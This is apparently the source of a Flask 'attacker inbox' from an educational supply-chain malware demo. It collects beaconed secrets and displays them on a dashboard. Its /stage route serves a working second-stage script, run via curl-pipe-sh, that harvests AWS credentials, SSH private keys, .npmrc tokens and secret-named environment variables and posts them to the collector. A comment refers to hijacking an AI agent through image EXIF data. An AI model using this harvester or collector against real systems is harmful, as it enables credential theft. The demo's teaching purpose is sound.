# EDUCATIONAL DEMO ONLY — the "attacker inbox".
# Stands in for the Discord/Slack webhook, webhook.site collector, or raw-IP C2
# that real npm malware beacons stolen secrets to. Here it only ever receives
# POSTs from containers on the local Docker network and is viewed at loopback,
# so nothing leaves the machine. Every secret it displays is a PLANT.
import base64
import json
import os
from datetime import datetime, timezone

from flask import Flask, request, Response

app = Flask(__name__)
PORT = int(os.environ.get("PORT", "8080"))
LOOT = []  # in-memory; also appended to /data/loot.jsonl
_seq = 0   # monotonic id so the UI can delete a single beacon


def _persist(entry):
    try:
        os.makedirs("/data", exist_ok=True)
        with open("/data/loot.jsonl", "a") as f:
            f.write(json.dumps(entry) + "\n")
    except Exception:
        pass


@app.route("/collect", methods=["POST"])
def collect():
    raw = request.get_data()
    body = None
    # Accept JSON, a Discord {content,embeds} shape, OR a base64 blob (obfuscated payload).
    for attempt in (lambda: json.loads(raw),
                    lambda: json.loads(base64.b64decode(raw))):
        try:
            body = attempt()
            break
        except Exception:
            continue
    if not isinstance(body, dict):
        # valid JSON but not an object (number/str/list), or undecodable → wrap it
        body = {"raw": body if body is not None else raw.decode("utf-8", "replace")}
    global _seq
    _seq += 1
    entry = {
        "id": _seq,
        "received": datetime.now(timezone.utc).strftime("%H:%M:%S UTC"),
        "src": request.headers.get("X-Forwarded-For", request.remote_addr),
        "host": body.get("host"),
        "user": body.get("user"),
        "beacon": body,
    }
    LOOT.insert(0, entry)
    _persist(entry)
    return {"status": "ok", "captured": len(LOOT)}, 200


@app.route("/reset", methods=["GET", "POST"])
def reset():
    LOOT.clear()
    return {"status": "cleared"}, 200


@app.route("/delete/<int:eid>", methods=["GET", "POST"])
def delete(eid):
    global LOOT
    LOOT = [e for e in LOOT if e.get("id") != eid]
    return {"status": "deleted", "remaining": len(LOOT)}, 200


# Second-stage harvester the "C2" serves — fetched and run by a hijacked victim
# (curl .../stage | sh), exactly like real malware pulls stage-2 from its server
# (cf. ethers-provider2). It sweeps the victim's PLANTED FAKE secrets and beacons
# them back to /collect — the same inbox the npm demo feeds, which keeps appending.
STAGE = (
    "#!/bin/sh\n"
    "python3 -c 'import os,json,socket,urllib.request as u; "
    "files={p:open(p).read().strip() for p in [\"/root/.aws/credentials\",\"/root/.ssh/id_rsa\",\"/root/.npmrc\"] if os.path.exists(p)}; "
    "env={k:v for k,v in os.environ.items() if any(s in k.upper() for s in [\"KEY\",\"TOKEN\",\"SECRET\",\"PASS\"])}; "
    "d={\"host\":socket.gethostname(),\"user\":os.getenv(\"USER\",\"root\"),\"via\":\"agent image-hijack (EXIF)\",\"loot\":{**env,**files}}; "
    "u.urlopen(u.Request(\"http://demo-collector:8080/collect\",json.dumps(d).encode(),{\"Content-Type\":\"application/json\"})); "
    "print(\"exfil sent:\",len(d[\"loot\"]),\"items to the attacker\")'\n"
)


@app.route("/stage")
def stage():
    return Response(STAGE, mimetype="text/x-shellscript")


@app.route("/api/loot")
def api_loot():
    return {"count": len(LOOT), "loot": LOOT}


PAGE = """<!doctype html><html lang=en><head><meta charset=utf-8>
<meta name=viewport content="width=device-width,initial-scale=1">
<title>ATTACKER INBOX</title><style>
:root{--bg:#0b0b0f;--card:#14141b;--edge:#262633;--red:#ff5f56;--grn:#6ee787;--amb:#ffbd2e;--dim:#8b949e;--txt:#e6edf3;
--mono:ui-monospace,"SF Mono",Menlo,Consolas,monospace}
*{box-sizing:border-box;margin:0}body{background:var(--bg);color:var(--txt);font-family:var(--mono);padding:28px}
header{display:flex;align-items:baseline;gap:18px;border-bottom:1px solid var(--edge);padding-bottom:18px;margin-bottom:22px}
h1{font-size:20px;letter-spacing:.14em;color:var(--red)}
.count{font-size:52px;color:var(--grn);line-height:1}.count small{font-size:14px;color:var(--dim);letter-spacing:.1em}
.sub{color:var(--dim);font-size:12px;margin-left:auto;text-align:right}
.empty{color:var(--dim);padding:60px 0;text-align:center;font-size:14px}
.card{background:var(--card);border:1px solid var(--edge);border-left:3px solid var(--grn);border-radius:10px;padding:16px 18px;margin-bottom:16px;animation:pop .4s ease}
@keyframes pop{from{transform:translateY(-8px);opacity:0}to{transform:none;opacity:1}}
.meta{display:flex;gap:16px;flex-wrap:wrap;font-size:12px;color:var(--dim);margin-bottom:12px}
.meta b{color:var(--amb)}
.loot{display:grid;grid-template-columns:140px 1fr;gap:4px 14px;font-size:12.5px;align-items:start}
.k{color:var(--red);white-space:nowrap}.v{color:var(--txt);white-space:pre-wrap;word-break:break-all}
.tag{display:inline-block;background:#2a1113;color:var(--red);border:1px solid #512;border-radius:5px;padding:1px 7px;font-size:10px;letter-spacing:.08em}
.del{margin-left:auto;background:transparent;border:1px solid var(--edge);color:var(--dim);border-radius:6px;padding:1px 9px;cursor:pointer;font-family:var(--mono);font-size:12px;line-height:1.4}
.del:hover{color:var(--red);border-color:#512}
.clear{margin-left:14px;align-self:center;background:transparent;border:1px solid var(--edge);color:var(--dim);border-radius:7px;padding:5px 11px;font-family:var(--mono);font-size:11px;cursor:pointer}
.clear:hover{color:var(--red);border-color:#512}
</style></head><body>
<header><h1>▶ ATTACKER INBOX</h1>
<div><div class=count id=count>0<small> SECRETS CAPTURED</small></div></div>
<div class=sub>local collector · demo-collector:8080<br>realistic mechanism · nothing leaves the machine</div>
<button class=clear onclick="clearAll()">clear all</button></header>
<div id=list><div class=empty>waiting for a victim's beacon…</div></div>
<script>
function esc(s){return String(s==null?'':s).replace(/[&<>]/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;'}[c]))}
function render(d){
  document.getElementById('count').innerHTML=d.count+'<small> SECRETS CAPTURED</small>';
  const list=document.getElementById('list');
  if(!d.loot.length){return}
  list.innerHTML=d.loot.map(e=>{
    const L=e.beacon&&e.beacon.loot?e.beacon.loot:{};
    let rows='';
    for(const k in L){const v=L[k];if(v==null||v==='')continue;
      rows+='<div class=k>'+esc(k)+'</div><div class=v>'+esc(typeof v==='object'?JSON.stringify(v,null,1):v)+'</div>';}
    return '<div class=card><div class=meta><span class=tag>EXFIL</span>'+
      '<span>'+esc(e.received)+'</span>'+
      '<span>victim <b>'+esc(e.user||'?')+'@'+esc(e.host||'?')+'</b></span>'+
      '<span>src '+esc(e.src||'?')+'</span>'+
      '<button class=del onclick="del('+e.id+')" title="delete this beacon">✕</button></div>'+
      '<div class=loot>'+(rows||'<div class=v>'+esc(JSON.stringify(e.beacon))+'</div>')+'</div></div>';
  }).join('');
}
async function del(id){try{await fetch('/delete/'+id,{method:'POST'})}catch(e){} last=-1; poll();}
async function clearAll(){if(!confirm('Clear the whole inbox?'))return; try{await fetch('/reset',{method:'POST'})}catch(e){} last=-1; poll();}
let last=-1;
async function poll(){try{const r=await fetch('/api/loot');const d=await r.json();
  if(d.count!==last){last=d.count;render(d)}}catch(e){}}
poll();setInterval(poll,1500);
</script></body></html>"""


@app.route("/")
def index():
    return Response(PAGE, mimetype="text/html")


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=PORT, threaded=True)
